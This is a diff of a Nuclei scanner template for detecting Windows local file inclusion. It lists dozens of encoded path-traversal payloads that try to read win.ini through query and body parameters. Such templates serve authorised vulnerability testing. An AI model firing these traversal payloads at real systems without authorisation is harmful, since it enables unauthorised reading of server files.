@@ -1,77 +1,77 @@
 id: windows-lfi-fuzz
-
 info:
   name: Local File Inclusion - Windows
   author: pussycat0x
   severity: high
   metadata:
     max-request: 39
-  tags: lfi,windows,dast,vuln
-
+  tags: dast,lfi,vuln,windows
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
+  - fuzzing:
+      - fuzz:
+          - '{{win_fuzz}}'
+        mode: multiple # replaces all parameters value with fuzz payload
+        parts:
+          - query
+          - body
+        type: replace # replaces existing parameter value with fuzz payload
+    matchers:
+      - condition: and
+        # digest: 4b0a0048304602210097c98ed16a07390cbb9ee8d16d7c77a132078dc42da5287f5ddbc33a517ac9e1022100a61552b4945ba285260c57b7f92533334bc51f18527462bc29ae76e8fd2c72ae:922c64590222798bb761d5b6d8e72950
 
+        part: body
+        type: word
+        words:
+          - bit app support
+          - fonts
+          - extensions
     payloads:
       win_fuzz:
-        low:
-          - '\WINDOWS\win.ini'
-          - '../../windows/win.ini'
-          - '....//....//windows/win.ini'
-          - '../../../../../windows/win.ini'
-          - '/..///////..////..//////windows/win.ini'
-          - '/../../../../../../../../../windows/win.ini'
-          - './../../../../../../../../../../windows/win.ini'
-          - '..%2f..%2f..%2f..%2fwindows/win.ini'
-        medium:
-          - '\WINDOWS\win.ini%00'
-          - '\WINNT\win.ini'
-          - '\WINNT\win.ini%00'
-          - 'windows/win.ini%00'
-          - '/...\...\...\...\...\...\...\...\...\windows\win.ini'
-          - '/.../.../.../.../.../.../.../.../.../windows/win.ini'
-          - '/..../..../..../..../..../..../..../..../..../windows/win.ini'
-          - '/....\....\....\....\....\....\....\....\....\windows\win.ini'
-          - '\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini'
-          - '/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini'
-          - '/../../../../../../../../../../../../../../../../&location=Windows/win.ini'
-          - '..%2f..%2f..%2f..%2f..%2fwindows/win.ini'
-          - '..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini'
-          - '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
-          - '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00'
-          - '..%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini'
         high:
-          - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini'
-          - '/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini'
-          - '.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini'
-          - '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini'
-          - '/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini'
-          - '/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'
+          - ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+          - /.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini
+          - .%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini
+          - /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini
+          - /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini
+          - /%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
           - '%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini'
           - '%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini'
-          - '/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini'
-          - '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\win.ini'
-          - '..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini'
-          - '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
+          - /%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini
+          - /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\win.ini
+          - ..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
+          - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
           - '%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini'
           - '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini'
-
-    fuzzing:
-      - part: query
-        type: replace # replaces existing parameter value with fuzz payload
-        mode: multiple # replaces all parameters value with fuzz payload
-        fuzz:
-          - '{{win_fuzz}}'
-
+        low:
+          - \WINDOWS\win.ini
+          - ../../windows/win.ini
+          - '....//....//windows/win.ini'
+          - ../../../../../windows/win.ini
+          - /..///////..////..//////windows/win.ini
+          - /../../../../../../../../../windows/win.ini
+          - ./../../../../../../../../../../windows/win.ini
+          - ..%2f..%2f..%2f..%2fwindows/win.ini
+        medium:
+          - \WINDOWS\win.ini%00
+          - \WINNT\win.ini
+          - \WINNT\win.ini%00
+          - windows/win.ini%00
+          - /...\...\...\...\...\...\...\...\...\windows\win.ini
+          - /.../.../.../.../.../.../.../.../.../windows/win.ini
+          - /..../..../..../..../..../..../..../..../..../windows/win.ini
+          - /....\....\....\....\....\....\....\....\....\windows\win.ini
+          - \\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini
+          - /..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
+          - /../../../../../../../../../../../../../../../../&location=Windows/win.ini
+          - ..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+          - ..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+          - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
+          - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini%00
+          - ..%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
+    pre-condition:
+      - dsl:
+          - method == "GET"
+          - method == "POST"
+          - method == "PUT"
+        type: dsl
     stop-at-first-match: true
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "bit app support"
-          - "fonts"
-          - "extensions"
-        condition: and
-
